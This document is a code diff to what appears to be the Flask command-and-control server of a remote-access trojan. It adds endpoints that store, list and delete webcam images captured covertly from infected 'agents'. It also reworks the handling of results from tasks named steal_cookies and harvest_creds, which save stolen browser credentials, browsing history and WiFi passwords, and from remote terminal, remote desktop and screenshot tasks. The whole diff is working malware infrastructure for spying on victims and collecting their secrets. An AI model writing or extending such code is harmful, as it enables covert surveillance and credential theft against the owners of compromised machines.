@@ -1,5 +1,6 @@
 import os
 import sqlite3
+import io
 from flask import jsonify, request, Response, send_from_directory
 from flask_login import login_required
 from flask_login import current_user
@@ -738,6 +739,85 @@ def init_api_routes(app, socketio):
             if conn:
                 conn.close()
 
+    # Webcam capture endpoints
+    @app.route('/api/webcam_captures/<int:capture_id>')
+    @login_required
+    def get_webcam_capture_api(capture_id):
+        conn = sqlite3.connect(CONFIG.database)
+        c = conn.cursor()
+        c.execute("SELECT image FROM webcam_captures WHERE id=?", (capture_id,))
+        result = c.fetchone()
+        conn.close()
+
+        if not result or not result[0]:
+            return jsonify({"status": "error", "message": "Webcam capture not found"}), 404
+
+        return send_file(
+            io.BytesIO(result[0]),
+            mimetype='image/jpeg',
+            download_name=f"webcam_{capture_id}.jpg"
+        )
+
+    @app.route('/api/webcam_captures', methods=['GET'])
+    @login_required
+    def get_webcam_captures():
+        try:
+            agent_id = request.args.get('agent_id')
+            conn = sqlite3.connect(CONFIG.database)
+            c = conn.cursor()
+
+            if agent_id:
+                c.execute('''SELECT wc.id, wc.timestamp, a.hostname, a.id as agent_id
+                             FROM webcam_captures wc LEFT JOIN agents a ON wc.agent_id = a.id
+                             WHERE wc.agent_id=? ORDER BY wc.timestamp DESC LIMIT 50''', (agent_id,))
+            else:
+                c.execute('''SELECT wc.id, wc.timestamp, a.hostname, a.id as agent_id
+                             FROM webcam_captures wc LEFT JOIN agents a ON wc.agent_id = a.id
+                             ORDER BY wc.timestamp DESC LIMIT 50''')
+
+            captures = [dict(zip(['id', 'timestamp', 'hostname', 'agent_id'], row))
+                       for row in c.fetchall()]
+
+            conn.close()
+            return jsonify({'status': 'success', 'captures': captures})
+        except Exception as e:
+            app.logger.error(f"Error fetching webcam captures: {str(e)}")
+            return jsonify({'status': 'error', 'message': str(e)}), 500
+
+    @app.route('/api/webcam_captures/<int:capture_id>', methods=['DELETE'])
+    @login_required
+    def delete_webcam_capture(capture_id):
+        conn = None
+        try:
+            conn = sqlite3.connect(CONFIG.database)
+            c = conn.cursor()
+
+            c.execute("SELECT id, agent_id FROM webcam_captures WHERE id = ?", (capture_id,))
+            capture = c.fetchone()
+
+            if not capture:
+                return jsonify({"status": "error", "message": "Webcam capture not found"}), 404
+
+            c.execute("DELETE FROM webcam_captures WHERE id = ?", (capture_id,))
+
+            conn.commit()
+
+            socketio.emit('webcam_capture_deleted', {
+                'capture_id': capture_id,
+                'agent_id': capture[1]
+            })
+
+            return jsonify({"status": "success"}), 200
+
+        except Exception as e:
+            app.logger.error(f"Error deleting webcam capture: {str(e)}")
+            if conn:
+                conn.rollback()
+            return jsonify({"status": "error", "message": str(e)}), 500
+        finally:
+            if conn:
+                conn.close()
+
     @app.route('/api/agents/<string:agent_id>', methods=['DELETE'])
     @login_required
     def delete_agent(agent_id):
@@ -884,7 +964,7 @@ def init_api_routes(app, socketio):
                     (datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') , data['task_id']))
             
             # Handle different task types
-            if data['task_type'] == 'steal_cookies' and 'result' in data and 'results' in data['result']:
+            if data['task_type'] == 'steal_cookies' and data.get('result') and data['result'].get('results'):
                 app.logger.info(f"Processing cookie data from {len(data['result']['results'])} browsers")
                 
                 for result in data['result']['results']:
@@ -934,63 +1014,79 @@ def init_api_routes(app, socketio):
                         continue
             
             # Handle websocket status updates
-            if data['task_type'] == 'websocket':
-                ws_connected = 1 if (data['result'].get('status') == 'success' and
-                                'connected' in data['result'].get('message', '').lower()) else 0
+            if data['task_type'] == 'websocket' and data.get('result'):
+                result = data['result']
+                ws_connected = 1 if (result.get('status') == 'success' and
+                                'connected' in (result.get('message') or '').lower()) else 0
                 c.execute('''UPDATE agents SET ws_connected=? WHERE id=?''',
                         (ws_connected, data['agent_id']))
 
                 socketio.emit('ws_status', {
                     'agent_id': data['agent_id'],
-                    'action': data['result'].get('action', ''),
+                    'action': result.get('action', ''),
                     'status': 'success' if ws_connected else 'error',
-                    'message': data['result'].get('message', '')
+                    'message': result.get('message', '')
                 }, room=f"terminal_{data['agent_id']}", namespace='/terminal')
 
             # Handle remote desktop status updates
-            if data['task_type'] == 'remote_desktop':
-                rd_connected = 1 if (data['result'].get('status') == 'success' and
-                                'connected' in data['result'].get('message', '').lower()) else 0
+            if data['task_type'] == 'remote_desktop' and data.get('result'):
+                result = data['result']
+                rd_connected = 1 if (result.get('status') == 'success' and
+                                'connected' in (result.get('message') or '').lower()) else 0
                 c.execute('''UPDATE agents SET rd_connected=? WHERE id=?''',
                         (rd_connected, data['agent_id']))
 
                 socketio.emit('rd_status', {
                     'agent_id': data['agent_id'],
-                    'action': data['result'].get('action', ''),
+                    'action': result.get('action', ''),
                     'status': 'success' if rd_connected else 'error',
-                    'message': data['result'].get('message', '')
+                    'message': result.get('message', '')
                 }, room=f"remote_desktop_{data['agent_id']}", namespace='/remote_desktop')
             
             # Handle terminal output
-            if data['task_type'] == 'terminal' and data['result'].get('terminal', False):
+            if data['task_type'] == 'terminal' and data.get('result') and data['result'].get('terminal', False):
+                result = data['result']
                 socketio.emit('terminal_output', {
                     'agent_id': data['agent_id'],
-                    'command': data['result'].get('command', ''),
-                    'output': data['result'].get('output', ''),
-                    'error': data['result'].get('error', ''),
-                    'current_dir': data['result'].get('current_dir', ''),
+                    'command': result.get('command', ''),
+                    'output': result.get('output', ''),
+                    'error': result.get('error', ''),
+                    'current_dir': result.get('current_dir', ''),
                     'task_id': data['task_id']
                 }, room=f"terminal_{data['agent_id']}", namespace='/terminal')
 
             # Handle screenshots
-            if data['task_type'] == 'screenshot' and 'screenshot' in data['result']:
+            if data['task_type'] == 'screenshot' and data.get('result') and 'screenshot' in data['result']:
                 try:
                     image_data = base64.b64decode(data['result']['screenshot'])
-                    c.execute('''INSERT INTO screenshots 
+                    c.execute('''INSERT INTO screenshots
                                 VALUES (?, ?, ?, ?)''',
-                            (None, data['agent_id'], 
+                            (None, data['agent_id'],
                             image_data,
                             datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') ))
                 except Exception as e:
                     app.logger.error(f"Error storing screenshot: {str(e)}")
 
+            # Handle webcam images
+            if data['task_type'] == 'webcam' and data.get('result') and 'webcam' in data['result']:
+                try:
+                    image_data = base64.b64decode(data['result']['webcam'])
+                    c.execute('''INSERT INTO webcam_captures
+                                VALUES (?, ?, ?, ?)''',
+                            (None, data['agent_id'],
+                            image_data,
+                            datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') ))
+                except Exception as e:
+                    app.logger.error(f"Error storing webcam image: {str(e)}")
+
             # Handle credential harvesting
-            if data['task_type'] == 'harvest_creds' and 'result' in data and 'credentials' in data['result']:
+            if data['task_type'] == 'harvest_creds' and data.get('result') and data['result'].get('credentials'):
                 app.logger.info(f"Processing credential harvesting results for agent {data['agent_id']}")
+                result = data['result']
                 # Store browser credentials
-                if 'credentials' in data['result']:
-                    app.logger.info(f"Storing {len(data['result']['credentials'])} credentials")
-                    for cred in data['result']['credentials']:
+                if 'credentials' in result:
+                    app.logger.info(f"Storing {len(result['credentials'])} credentials")
+                    for cred in result['credentials']:
                         try:
                             # Check if this credential already exists
                             c.execute('''SELECT id FROM credentials
@@ -1015,9 +1111,9 @@ def init_api_routes(app, socketio):
                             app.logger.error(f"Error storing browser credential: {str(e)}")
 
                 # Store browser history
-                if 'history' in data['result']:
-                    app.logger.info(f"Storing {len(data['result']['history'])} history entries")
-                    for hist in data['result']['history']:
+                if 'history' in result:
+                    app.logger.info(f"Storing {len(result['history'])} history entries")
+                    for hist in result['history']:
                         try:
                             # Check if this history entry already exists
                             c.execute('''SELECT id FROM browser_history
@@ -1043,9 +1139,9 @@ def init_api_routes(app, socketio):
                             app.logger.error(f"Error storing browser history: {str(e)}")
 
                 # Store WiFi passwords (if any new ones)
-                if 'wifi' in data['result']:
-                    app.logger.info(f"Storing {len(data['result']['wifi'])} WiFi passwords")
-                    for wifi in data['result']['wifi']:
+                if 'wifi' in result:
+                    app.logger.info(f"Storing {len(result['wifi'])} WiFi passwords")
+                    for wifi in result['wifi']:
                         try:
                             # Check if this WiFi credential already exists
                             c.execute('''SELECT id FROM credentials
